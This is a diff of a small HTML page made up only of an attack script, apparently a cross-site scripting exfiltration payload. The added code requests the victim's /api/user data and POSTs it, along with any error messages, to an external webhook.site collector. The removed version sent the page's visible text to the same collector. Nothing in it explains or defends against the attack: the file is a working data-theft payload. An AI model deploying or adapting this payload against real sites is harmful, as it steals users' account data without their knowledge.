@@ -2,11 +2,22 @@
 <html>
   <body>
     <script>
-      fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "html=" + encodeURIComponent(document.body.innerText)
-      });
+      fetch("/api/user")
+        .then(r => r.text())
+        .then(data => {
+          fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "user=" + encodeURIComponent(data)
+          });
+        })
+        .catch(e => {
+          fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "error=" + encodeURIComponent(e)
+          });
+        });
     </script>
   </body>
 </html>
